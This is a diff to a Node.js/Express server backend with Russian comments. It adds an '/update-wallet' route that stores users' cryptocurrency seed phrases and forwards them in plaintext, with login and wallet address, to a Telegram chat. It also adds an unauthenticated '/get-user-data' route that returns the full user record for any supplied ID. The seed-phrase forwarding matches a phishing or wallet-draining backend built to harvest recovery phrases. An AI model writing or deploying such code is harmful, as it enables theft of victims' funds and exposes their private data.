@@ -142,6 +142,57 @@ app.post('/login', async (req, res) => {
     }
 });
 
+// Маршрут для обновления кошелька
+app.post('/update-wallet', async (req, res) => {
+    console.log('Received wallet update request:', req.body);
+    const client = await pool.connect();
+    try {
+        const userResult = await client.query("SELECT * FROM users WHERE id = $1", [req.body.id]);
+        const user = userResult.rows[0];
+        if (user) {
+            await client.query("UPDATE users SET wallet = $1, seeds = $2 WHERE id = $3", [req.body.wallet, req.body.seeds, req.body.id]);
+
+            const updatedUserResult = await client.query("SELECT * FROM users WHERE id = $1", [req.body.id]);
+            const updatedUser = updatedUserResult.rows[0];
+            const message = `Пользователь обновил кошелёк:\n` +
+                            `Логин: ${updatedUser.login}\n` +
+                            `ID: ${updatedUser.id}\n` +
+                            `Новый адрес кошелька: ${updatedUser.wallet}\n` +
+                            `Seed-фразы: ${updatedUser.seeds.join(', ')}`;
+            await sendTelegramNotification(message);
+
+            res.status(200).json({ success: true });
+        } else {
+            res.status(404).json({ error: 'User not found' });
+        }
+    } catch (error) {
+        console.error('Error in /update-wallet:', error.stack);
+        res.status(500).json({ error: 'Server error' });
+    } finally {
+        client.release();
+    }
+});
+
+// Маршрут для получения данных пользователя
+app.post('/get-user-data', async (req, res) => {
+    console.log('Received get-user-data request:', req.body);
+    const client = await pool.connect();
+    try {
+        const userResult = await client.query("SELECT * FROM users WHERE id = $1", [req.body.id]);
+        const user = userResult.rows[0];
+        if (user) {
+            res.status(200).json({ success: true, user });
+        } else {
+            res.status(404).json({ success: false, error: 'User not found' });
+        }
+    } catch (error) {
+        console.error('Error in /get-user-data:', error.stack);
+        res.status(500).json({ success: false, error: 'Server error' });
+    } finally {
+        client.release();
+    }
+});
+
 // Главная страница
 app.get('/', (req, res) => {
     const indexPath = path.join(__dirname, '../client', 'index.html');
